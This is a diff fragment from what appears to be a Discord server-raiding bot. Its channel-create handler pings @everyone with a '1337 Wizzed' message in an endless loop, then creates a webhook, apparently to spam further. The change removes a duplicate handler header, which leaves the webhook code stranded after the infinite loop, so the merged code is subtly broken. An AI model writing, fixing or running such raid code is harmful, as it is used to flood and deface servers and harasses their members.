@@ -178,8 +178,6 @@ async def roles(ctx):
 async def on_guild_channel_create(channel):
   while True:
     await channel.send("@everyone 1337 Wizzed This Shit.")
-@bot.event
-async def on_guild_channel_create(channel):
   webhook = await channel.create_webhook(name="1337")
   webhook_url = webhook.url
   async with aiohttp.ClientSession() as session:
